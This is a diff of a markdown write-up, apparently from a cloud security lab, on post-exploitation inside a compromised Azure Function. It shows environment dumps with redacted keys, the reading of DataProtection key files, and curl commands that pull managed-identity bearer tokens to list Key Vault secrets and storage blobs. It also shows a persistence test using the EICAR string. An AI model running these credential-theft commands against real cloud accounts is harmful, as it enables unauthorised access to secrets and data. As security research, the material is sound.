@@ -6,22 +6,31 @@ Running under a consumption based Azure function (cold starts). Included a SP at
 
 ```
 id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+# This varies as an older deployment had this result:
+
 uid=1000(app) gid=1000(app) groups=1000(app)
 ```
 
 ```
 whoami
-app
+
+root
 ```
 
 ```
 pwd
+
 /
 ```
 
 ```
 ls
+
 FuncExtensionBundles
+appsvctmp
 azure-functions-host
 bin
 boot
@@ -30,7 +39,6 @@ etc
 home
 lib
 lib64
-lost+found
 media
 mnt
 opt
@@ -38,7 +46,6 @@ proc
 root
 run
 sbin
-squashfuse
 srv
 sys
 tmp
@@ -48,6 +55,7 @@ var
 
 ```
 cat /etc/os-release
+
 PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
 NAME="Debian GNU/Linux"
 VERSION_ID="9"
@@ -61,101 +69,95 @@ BUG_REPORT_URL="https://bugs.debian.org/"
 
 ```
 env
-CORS_SUPPORT_CREDENTIALS=False
-MSI_ENDPOINT=http://localhost:8081/msi/token
-ResourceType=Microsoft.ServiceFabricMesh/applications
-ResourceGroupName=AZCONTAINERS-WAWS-PROD-BAY-063-5
-FUNCTIONS_WORKER_RUNTIME_VERSION=~2
-WEBSITE_HOME_STAMPNAME=waws-prod-bay-063
-LANG=C.UTF-8
-WEBSITE_SITE_NAME=pumapreycougar
-SUDO_GID=0
-ScmType=None
-HOST_VERSION=2.0.12888.0
-HOSTNAME=ccvm1
-APPSETTING_ScmType=None
-APPSETTING_WEBSITE_RUN_FROM_PACKAGE=https://abc.blob.core.windows.net/function-releases/20191223184402-8b9cf6ad-0395-42b0-8378-29d64be68803.zip
-WEBSITE_RUN_FROM_PACKAGE=https://abc.blob.core.windows.net/function-releases/20191223184402-8b9cf6ad-0395-42b0-8378-29d64be68803.zip
-WEBSITE_AUTH_ENCRYPTION_KEY=XXXXX
-ASPNETCORE_URLS=http://localhost:9091
-APPSETTING_AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=YYYYY;AccountKey=ZZZZZ;EndpointSuffix=core.windows.net
-Fabric_ServiceDnsName=functionsRuntimeService.App-9133AA1C-637127197019543644
-SCM_RUN_FROM_PACKAGE=https://abc.blob.core.windows.net/scm-releases/scm-latest-pumapreycougar.zipse=2029-12-16T23%3A34%3A21Z&sp=rw
-USERNAME=app
-JAVA_HOME=/usr/lib/jvm/zre-8-azure-amd64
-SUDO_COMMAND=/azure-functions-host/Microsoft.Azure.WebJobs.Script.WebHost
-AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=YYYYY;AccountKey=ZZZZZ;EndpointSuffix=core.windows.net
-APPSETTING_APPINSIGHTS_INSTRUMENTATIONKEY=ABC123
-AzureWebJobsScriptRoot=/home/site/wwwroot
-APPSETTING_FUNCTIONS_WORKER_RUNTIME=dotnet
-FUNCTIONS_EXTENSION_VERSION=~2
-USER=app
-Fabric_ReplicaId=132215965073936227
-CONTAINER_IMAGE_URL=mcr.microsoft.com/azure-functions/mesh:2.0.12888a
-SubscriptionId=ABC123
-WEBSITE_STAMP_DEPLOYMENT_ID=ABC123
-Fabric_Epoch=132215965068079940:8589934592
-PWD=/
-HOME=/home
-SUDO_USER=root
-WEBSITE_CONTAINER_READY=1
-WEBSITE_OWNER_NAME=YYYYY
-WEBSITE_AUTH_ENABLED=False
-Fabric_ReplicaName=0
-ResourceName=App-AAA-BBB
-APPSETTING_FUNCTIONS_EXTENSION_VERSION=~2
-APPSETTING_WEBSITE_SITE_NAME=pumapreycougar
-AzureWebEncryptionKey=ABC123
-WEBSITE_HOSTNAME=pumapreycougar.azurewebsites.net
-CONTAINER_ENCRYPTION_KEY=ABC123
-Fabric_Id=67450c32-a618-4f40-8c9e-2a9aaa074ee2
-Fabric_NetworkingMode=Other
+
+HASH=abc123
+https_only=true
+PLATFORM_VERSION=87.0.7.83
+WEBSITE_INSTANCE_ID=2120174d611510bdf6ad494d55d9c98484f6a813d5b363a6244556f9f3045668
 DOTNET_USE_POLLING_FILE_WATCHER=true
-SUDO_UID=0
-CONTAINER_NAME=9133AA1C-637127197019543644
-ASPNETCORE_VERSION=2.2.7
-DOTNET_RUNNING_IN_CONTAINER=true
-TERM=xterm
-SHELL=/bin/bash
-MSI_SECRET=ABC123
-APPSETTING_WEBSITE_SLOT_NAME=Production
-Fabric_ServiceName=functionsRuntimeService
-Fabric_ApplicationName=App-9133AA1C-637127197019543644
-Fabric_CodePackageName=functionsRuntimeContainer
-CORS_ALLOWED_ORIGINS=["https://functions.azure.com","https://functions-staging.azure.com","https://functions-next.azure.com"]
-Location=West US
+HOSTNAME=4059deb9fe79
+AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
 SHLVL=1
-FUNCTIONS_WORKER_RUNTIME=dotnet
-APPINSIGHTS_INSTRUMENTATIONKEY=ABC-1234
-WEBSITE_PLACEHOLDER_MODE=0
-CodePackageName=functionsRuntimeContainer
-LOGNAME=app
-APPSETTING_SCM_RUN_FROM_PACKAGE=https://abc123.blob.core.windows.net/scm-releases/scm-latest-pumapreycougar.zip
-CONTAINER_START_CONTEXT_SAS_URI=http://abcq23.blob.core.windows.net/azcontainers/9133aa1c-637127197019543644
+IDENTITY_HEADER=28ab5f3d-aa55-4270-a102-958c26dfec1a
+HOME=/home
+WEBSITE_RESOURCE_GROUP=cougar
+WEBSITE_CORS_SUPPORT_CREDENTIALS=False
+APPSETTING_https_only=true
+DIAGNOSTIC_LOGS_MOUNT_PATH=/var/log/diagnosticLogs
+DOTNET_RUNNING_IN_CONTAINER=true
+APPSETTING_AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
+ScmType=None
+APPSETTING_HASH=abc123
+WEBSITE_HOSTNAME=abc123.azurewebsites.net
+WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
+WEBSITE_ROLE_INSTANCE_ID=0
+WEBSITE_RUN_FROM_PACKAGE=https://abc123.blob.core.windows.net/function-releases/./functionapp.zip?sv=2017-07-29&ss=b&srt=o&sp=r&se=2021-12-31&st=2019-01-01&spr=https&sig=abc123
+AzureWebJobsScriptRoot=/home/site/wwwroot
+WEBSITE_AUTH_ENCRYPTION_KEY=ABC123
+APPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
+_=/azure-functions-host/Microsoft.Azure.WebJobs.Script.WebHost
+APPSETTING_WEBSITE_RUN_FROM_PACKAGE=https://abc123.blob.core.windows.net/function-releases/./functionapp.zip?sv=2017-07-29&ss=b&srt=o&sp=r&se=2021-12-31&st=2019-01-01&spr=https&sig=abc123
+WEBSITE_SITE_NAME=abc123
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+FUNCTIONS_EXTENSION_VERSION=beta
+MACHINEKEY_DecryptionKey=abc123
+WEBSITE_AUTH_AUTO_AAD=False
+FUNCTION_APP_EDIT_MODE=readonly
+APPSETTING_WEBSITE_SITE_NAME=abc123
+APPSETTING_FUNCTIONS_EXTENSION_VERSION=beta
+MSI_ENDPOINT=http://172.16.1.3:8081/msi/token
+WEBSITE_AUTH_ENABLED=False
+APPSETTING_FUNCTION_APP_EDIT_MODE=readonly
+MSI_SECRET=ABC123
+APPSETTING_WEBSITE_AUTH_AUTO_AAD=False
+FUNCTIONS_WORKER_RUNTIME=dotnet
+AzureWebJobsDashboard=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
 APPSETTING_WEBSITE_AUTH_ENABLED=False
-MESH_INIT_URI=http://localhost:6060/
-ServiceName=functionsRuntimeService
-Fabric_NodeIPOrFQDN=10.92.0.4
+WEBSITE_OWNER_NAME=47d488d2-f662-46c2-8183-8fce2aefa6aa+Cougar-CentralUSwebspace
+APPSETTING_FUNCTIONS_WORKER_RUNTIME=dotnet
+WEBSITE_CORS_ALLOWED_ORIGINS=https://functions.azure.com,https://functions-staging.azure.com,https://functions-next.azure.com
+APPSETTING_AzureWebJobsDashboard=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
 WEBSITE_SLOT_NAME=Production
-_=/usr/bin/env
+IDENTITY_ENDPOINT=http://172.16.1.3:8081/msi/token
+PWD=/
+ASPNETCORE_URLS=http://*:80
+COMPUTERNAME=RD0003FF6441B7
+APPSVC_RUN_ZIP=FALSE
+FUNCTIONS_LOGS_MOUNT_PATH=/var/log/functionsLogs
+SSH_PORT=2222
+APPSETTING_WEBSITE_SLOT_NAME=Production
+APPSETTING_ScmType=None
+WEBSITE_AUTH_SIGNING_KEY=ABC123
 ```
 
 ```
-ls -la ~/.aspnet
-total 12
-drwxr-xr-x 3 app app 4096 Dec 23 19:22 .
-drwxr-xr-x 1 app app 4096 Dec 23 19:23 ..
-drwxr-xr-x 2 app app 4096 Dec 23 19:22 DataProtection-Keys
-ls -la ~/.aspnet/DataProtection-Keys
-total 12
-drwxr-xr-x 2 app app 4096 Dec 23 19:22 .
-drwxr-xr-x 3 app app 4096 Dec 23 19:22 ..
--rw-r--r-- 1 app app 1000 Dec 23 19:22 key-76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5.xml
+ls -al /home/site/wwwroot
+
+total 127
+drwxrwxr-x  7 nobody nogroup      0 Mar 25 06:05 .
+drwxrwxrwx  2 nobody nogroup      0 Mar 25 06:33 ..
+drwxrwxr-x  3 nobody nogroup      0 Mar 25 06:05 Cougar
+-rw-r--r--  1 nobody nogroup 128384 Jan  1  2049 Cougar.deps.json
+-rw-r--r--  1 nobody nogroup    158 Jan  1  2049 appsettings.json
+drwxrwxr-x 67 nobody nogroup      0 Mar 25 06:05 bin
+-rw-r--r--  1 nobody nogroup     26 Jan  1  2049 host.json
+```
+ls -al /home/ASP.NET
+total 0
+drwxrwxrwx 2 nobody nogroup 0 Mar 25 06:13 .
+drwxrwxrwx 2 nobody nogroup 0 Mar 25 06:15 ..
+drwxrwxrwx 2 nobody nogroup 0 Mar 25 06:13 DataProtection-Keys
+
+ls -al /home/ASP.NET/DataProtection-Keys
+
+total 4
+drwxrwxrwx 2 nobody nogroup    0 Mar 25 06:13 .
+drwxrwxrwx 2 nobody nogroup    0 Mar 25 06:13 ..
+-rwxrwxrwx 1 nobody nogroup 1000 Mar 25 06:13 key-04e38819-2f49-4339-8c5f-49cedad4f1f6.xml
 ```
 
 ```
-cat ~/.aspnet/DataProtection-Keys/key-76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5.xml
+cat /home/ASP.NET/DataProtection-Keys/key-*.xml
 
 <?xml version="1.0" encoding="utf-8"?>
 <key id="76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5" version="1">
@@ -179,15 +181,15 @@ Querying the MSI service for bearer tokens:
 ```
 env | grep 'MSI'
 
-MSI_ENDPOINT=http://localhost:8081/msi/token
+MSI_ENDPOINT=http://172.16.1.3:8081/msi/token
 MSI_SECRET=ABC123
 ```
 
 Research on MSI architecture: https://techcommunity.microsoft.com/t5/Azure-Developer-Community-Blog/Understanding-Azure-MSI-Managed-Service-Identity-tokens-caching/ba-p/337406
 
-
-```
+```bash
 curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
+echo
 ```
 
 Response is a JWT that can be used to access the storage service for 8 hours. Example of the decoded token:
@@ -222,13 +224,14 @@ From the compromised function, request a Bearer token for the vault service:
 
 ```bash
 curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
+echo
 ```
 
 List the secrets:
 
 ```bash
 export BEARER_TOKEN=<SET TOKEN VALUE>
-export VAULT_NAME=<ENTER_KEY_VAULT_NAME>
+export VAULT_NAME=cougar$TF_VAR_UniqueString
 curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
 ```
 
@@ -254,55 +257,169 @@ From the compromised function, request a Bearer token for the storage service:
 
 ```bash
 curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
+echo
 ```
 
 List the storage account containers:
 
 ```bash
 export BEARER_TOKEN=<SET TOKEN VALUE>
-export STORAGE_ACCOUNT=<ENTER STORAGE ACCOUNT NAME>
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list"
+export STORAGE_ACCOUNT="cougarassets$TF_VAR_UniqueString"
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list" | xmllint --format -
 ```
-
-OMG, you're killing me MS. XML? How the hell am I supposed to `jq` this now.
 
 ```xml
-<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://<STORAGE_ACCOUNT_NAME>.blob.core.windows.net/"><Containers><Container><Name>azure-webjobs-hosts</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:28 GMT</Last-Modified><Etag>"0x8D784DBFDE574A4"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>azure-webjobs-secrets</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:53 GMT</Last-Modified><Etag>"0x8D784DC0CC0565B"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>function-releases</Name><Properties><Last-Modified>Mon, 23 Dec 2019 18:44:03 GMT</Last-Modified><Etag>"0x8D787D8157D05E8"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>images</Name><Properties><Last-Modified>Tue, 24 Dec 2019 18:24:51 GMT</Last-Modified><Etag>"0x8D7889E911892AF"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>scm-releases</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:21 GMT</Last-Modified><Etag>"0x8D784DBF9AF6632"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container></Containers><NextMarker /></EnumerationResults>
+<?xml version="1.0" encoding="utf-8"?>
+<EnumerationResults ServiceEndpoint="https://cougar<UNIQUE_STRING>.blob.core.windows.net/">
+  <Containers>
+    <Container>
+      <Name>azure-webjobs-hosts</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:52:51 GMT</Last-Modified>
+        <Etag>"0x8D7CC2E584F1AF9"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+    <Container>
+      <Name>azure-webjobs-secrets</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:52:47 GMT</Last-Modified>
+        <Etag>"0x8D7CC2E559F352A"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+    <Container>
+      <Name>function-releases</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:50:20 GMT</Last-Modified>
+        <Etag>"0x8D7CC2DFE3B3EE4"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+    <Container>
+      <Name>scm-releases</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:50:31 GMT</Last-Modified>
+        <Etag>"0x8D7CC2E049DE518"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+  </Containers>
+  <NextMarker/>
+</EnumerationResults>
 ```
 
-List the blobs in the images container:
+List the blobs in the assets container:
 
 ```bash
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images?restype=container&comp=list"
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/assets?restype=container&comp=list"
 ```
 
 Download our target cougar image:
 
 ```bash
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images/cougar.jpg" --output ~/Downloads/cougar.jpg
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/assets/cougar.jpg" --output ~/Downloads/cougar.jpg
 ```
 
 ## Persistence
 
-Persisting a malware payload into the runtime environment:
+Persisting a malware payload into the runtime environment. Unlike AWS, some directories other than `/tmp` are writable while the source directory is not:
 
 ```bash
-echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /tmp/malware.sh
-cat /tmp/malware.sh
+mount
+
+none on / type aufs (rw,relatime,si=3885b43376db3940,dio,dirperm1)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,nodev,size=65536k,mode=755,uid=231072,gid=231072)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=231077,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755,uid=231072,gid=231072)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,uid=231072,gid=231072)
+/dev/sda1 on /appsvctmp type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+//10.0.176.14/volume-5-default/35c6e87611d499b626dd/4837afd00de2424f847ae0d4cd8b7402 on /home type cifs (rw,relatime,vers=3.0,sec=ntlmssp,cache=strict,username=dummyadmin,domain=RD281878EC704F,uid=0,noforceuid,gid=0,noforcegid,addr=10.0.176.14,file_mode=0777,dir_mode=0777,nounix,serverino,mapposix,mfsymlinks,noperm,rsize=1048576,wsize=1048576,echo_interval=60,actimeo=1)
+/dev/sda1 on /home/site/wwwroot type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/sda1 on /var/ssl type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/loop0p1 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)
+/dev/loop0p1 on /etc/hostname type ext4 (rw,relatime,data=ordered)
+/dev/loop0p1 on /etc/hosts type ext4 (rw,relatime,data=ordered)
+fuse-zip on /home/site/wwwroot type fuse.fuse-zip (ro,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
+/dev/sda1 on /var/log/functionsLogs type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/sda1 on /var/log/diagnosticLogs type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+udev on /dev/null type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /dev/random type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /dev/full type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /dev/tty type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /dev/zero type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /dev/urandom type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+proc on /proc/bus type proc (ro,nodev,relatime)
+proc on /proc/fs type proc (ro,nodev,relatime)
+proc on /proc/irq type proc (ro,nodev,relatime)
+proc on /proc/sys type proc (ro,nodev,relatime)
+proc on /proc/sysrq-trigger type proc (ro,nodev,relatime)
+tmpfs on /proc/acpi type tmpfs (ro,nodev,relatime,uid=231072,gid=231072)
+udev on /proc/kcore type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /proc/keys type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /proc/timer_list type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /proc/timer_stats type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+udev on /proc/sched_debug type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
+tmpfs on /proc/scsi type tmpfs (ro,nodev,relatime,uid=231072,gid=231072)
+tmpfs on /sys/firmware type tmpfs (ro,nodev,relatime,uid=231072,gid=231072)
+
+cat "Malware" > /home/site/wwwroot/malware.sh # Silently fails.
+cat /home/site/wwwroot/malware.sh # Nothing.
+ls /home/site/wwwroot
+
+Cougar
+Cougar.deps.json
+appsettings.json
+bin
+host.json
+
+echo "Malware" > /malware.sh
+ls /malware.sh
+
+/malware.sh
+
+echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /malware.sh
+cat /malware.sh
 X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
 ```
 
 Waiting approximately 1 minute:
 
 ```bash
-cat /tmp/malware.sh
+cat /malware.sh
 X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
 ```
 
 Waiting approximately 2 minutes:
 
 ```bash
-cat /tmp/malware.sh
+cat /malware.sh
 X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
 ```
 
@@ -311,8 +428,8 @@ Waiting approximately 3 minutes:
 Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Finally, after 6 minutes of inactivity:
 
 ```bash
-cat /tmp/malware.sh
-cat: /tmp/malware.sh: No such file or directory
+cat /malware.sh
+cat: /malware.sh: No such file or directory
 ```
 
 ## Monitoring &amp; Incident Response
